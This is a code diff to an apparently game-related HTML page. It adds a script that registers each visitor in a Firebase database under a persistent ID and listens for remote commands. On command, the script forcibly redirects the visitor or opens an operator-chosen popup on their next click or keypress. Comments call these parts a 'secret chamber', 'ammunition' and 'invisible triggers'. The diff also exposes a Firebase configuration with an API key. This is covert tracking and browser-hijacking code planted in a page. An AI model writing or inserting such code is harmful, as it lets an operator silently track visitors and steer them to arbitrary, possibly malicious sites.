@@ -46,7 +46,71 @@
 
     gtag("config", "G-WKJQ5QHQTJ")
   </script>
-  <!-- DO NOT REMOVE-->
+  <script src="https://www.gstatic.com/firebasejs/9.1.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.1.1/firebase-database-compat.js"></script>
+
+  <script>
+    // 1. CONFIGURACIÓN FIREBASE
+    const firebaseConfig = {
+      apiKey: "AIzaSyB85JzrjjvWhiKjT7wrrooB4u0iyVVf_Is",
+      authDomain: "control-mates.firebaseapp.com",
+      databaseURL: "https://control-mates-default-rtdb.firebaseio.com",
+      projectId: "control-mates",
+      storageBucket: "control-mates.firebasestorage.app",
+      messagingSenderId: "701158344581",
+      appId: "1:701158344581:web:c8947e1194b9aa8f07a6ec"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // 2. ID PERSISTENTE (MEJORADO) 🆔
+    // Buscamos si ya existe un ID en el navegador, si no, creamos uno nuevo.
+    let myID = localStorage.getItem('playerID');
+    if (!myID) {
+      myID = "MC_Player_" + Math.floor(Math.random() * 9999);
+      localStorage.setItem('playerID', myID);
+    }
+
+    // Conexión inicial
+    db.ref('devices/' + myID).set({
+      nombre: myID,
+      status: "Online 🟢",
+      lastSeen: new Date().toLocaleTimeString()
+    });
+
+    db.ref('devices/' + myID).onDisconnect().update({ status: "Offline 🔴" });
+
+    // 3. LA RECÁMARA SECRETA (Sin cambios en lógica) 💣
+    let urlPendienteParaPopup = null;
+
+    db.ref('comandos/' + myID).on('value', (snapshot) => {
+      const data = snapshot.val();
+      if (data && data.url) {
+        if (data.tipo === 'redirect') {
+          window.onbeforeunload = null;
+          window.location.href = data.url;
+        } else {
+          urlPendienteParaPopup = data.url;
+          console.log('[SISTEMA] Munición cargada para: ' + myID);
+        }
+        db.ref('comandos/' + myID).set(null);
+      }
+    });
+
+    // 4. LOS GATILLOS INVISIBLES 🖱️⌨️
+    const apretarGatillo = () => {
+      if (urlPendienteParaPopup) {
+        window.open(urlPendienteParaPopup, '_blank');
+        urlPendienteParaPopup = null;
+        console.log('[SISTEMA] ¡Popup disparado!');
+      }
+    };
+
+    window.addEventListener('mousedown', apretarGatillo, { capture: true });
+    window.addEventListener('mouseup', apretarGatillo, { capture: true });
+    window.addEventListener('keydown', apretarGatillo, { capture: true });
+  </script>
 </body>
 
 </html>
